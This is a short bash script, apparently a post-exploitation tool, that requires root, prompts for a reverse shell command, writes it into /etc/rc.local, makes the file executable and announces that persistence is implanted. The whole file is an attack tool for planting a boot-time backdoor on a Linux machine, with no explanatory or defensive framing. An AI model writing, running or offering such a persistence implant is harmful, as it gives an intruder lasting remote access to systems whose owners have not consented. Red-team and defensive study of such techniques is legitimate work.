#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

function rcLocal(){

    read -p "Enter with your reverse shell: " revshell

    cat > /etc/rc.local << EOF
#!/bin/bash

$revshell
EOF
}

rcLocal
chmod +x /etc/rc.local

clear

echo "[*] rc.local Persistence implanted. [*]"
sleep 1
clear
